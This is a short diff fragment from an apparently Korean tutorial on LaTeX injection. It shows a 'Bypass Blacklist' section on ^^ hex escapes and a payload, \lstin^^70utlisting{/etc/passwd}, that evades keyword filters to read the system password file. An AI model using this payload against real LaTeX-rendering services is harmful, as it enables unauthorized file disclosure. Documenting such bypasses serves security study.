@@ -56,7 +56,7 @@ $ \LaTeX $ 란 주로 자연과학 혹은 수리 영역 논문에 사용되는 �
 #### Bypass Blacklist 
 
 - ^^41 == A
-- ^^7e == ~
+- ^^7e == ~   
 
 ```tex
 \lstin^^70utlisting{/etc/passwd}
